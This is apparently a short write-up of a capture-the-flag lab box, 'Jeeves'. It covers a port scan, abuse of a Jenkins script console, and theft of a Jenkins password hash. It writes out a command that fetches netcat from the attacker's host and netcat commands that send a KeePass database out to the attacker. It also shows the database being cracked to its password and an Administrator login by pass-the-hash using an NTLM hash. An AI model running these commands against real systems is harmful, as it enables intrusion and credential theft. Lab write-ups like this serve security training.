![image](https://user-images.githubusercontent.com/68326057/117423605-88a0ba00-af3e-11eb-882c-0e2ac2d9f280.png)

# NMAP

```bash
PORT      STATE SERVICE      REASON  VERSION
80/tcp    open  http         syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves

135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

50000/tcp open  http         syn-ack Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -23m08s, deviation: 0s, median: -23m08s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55172/tcp): CLEAN (Timeout)
|   Check 2 (port 4953/tcp): CLEAN (Timeout)
|   Check 3 (port 3169/udp): CLEAN (Timeout)
|   Check 4 (port 48293/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-07T13:53:07
|_  start_date: 2021-05-07T13:50:36
```

# SMB

```bash
crackmapexec smb IP
```

![image](https://user-images.githubusercontent.com/68326057/117424246-34e2a080-af3f-11eb-845f-65607edcee2b.png)

## /error.html

![image](https://user-images.githubusercontent.com/68326057/117424625-9acf2800-af3f-11eb-91ff-502cbfb33a03.png)


# jetty

![image](https://user-images.githubusercontent.com/68326057/117425482-7162cc00-af40-11eb-91e9-afbb9f81a4ce.png)

--> ![image](https://user-images.githubusercontent.com/68326057/117425524-79bb0700-af40-11eb-91d4-cf316a0db016.png)

```bash
http://10.10.10.63:50000/askjeeves/
```

## via script groovy

--> http://10.10.10.63:50000/askjeeves/script

![image](https://user-images.githubusercontent.com/68326057/117426769-ebe01b80-af41-11eb-8eb7-1493f2946501.png)

![image](https://user-images.githubusercontent.com/68326057/117427577-d0294500-af42-11eb-9805-a09b5cfe676d.png)

![image](https://user-images.githubusercontent.com/68326057/117427611-d7505300-af42-11eb-8696-9afa29e4691d.png)


# User

![image](https://user-images.githubusercontent.com/68326057/117428257-85f49380-af43-11eb-8255-1d67610d47f4.png)

![image](https://user-images.githubusercontent.com/68326057/117428946-2a76d580-af44-11eb-90b3-a29d88650714.png)

![image](https://user-images.githubusercontent.com/68326057/117429459-b426a300-af44-11eb-98aa-973fc89ad358.png)

```bash
 Directory of C:\Users\Administrator\.jenkins\users\admin                                                                              
                                                                                                                                       
11/03/2017  10:34 PM    <DIR>          .                                                                                               
11/03/2017  10:34 PM    <DIR>          ..                                                                                              
11/03/2017  10:34 PM             1,419 config.xml                                                                                      
               1 File(s)          1,419 bytes                                                                                          
               2 Dir(s)   7,482,236,928 bytes free                                                                                     
                                                                                                                                       
C:\Users\Administrator\.jenkins\users\admin>type config.xml  
```

```bash
<passwordHash>#jbcrypt:$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO</passwordHash>
```


--> https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

Use This to Download file

```bash
powershell.exe wget "http://10.10.14.21:8000/nc.exe -o nc.exe 
```

# Sending file

```bash
My machine 
sudo nc -l -p 999 > CEH.kbdx

On Victim
nc.exe -w 5 MYIP 999 < CEH.kbdx
```

```bash
file CEH.kdbx 
CEH.kdbx: Keepass password database 2.x KDBX
keepass2john CEH.kdbx > hash
```

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:00:41 DONE (2021-05-07 21:14) 0.02424g/s 1332p/s 1332c/s 1332C/s mylove08..monkeybum
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

# ADMINISTRATOR

```bash
pth-winexe -Ujeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd
```

![image](https://user-images.githubusercontent.com/68326057/117436591-c4428080-af4c-11eb-8f24-9eb4a44bbbd8.png)
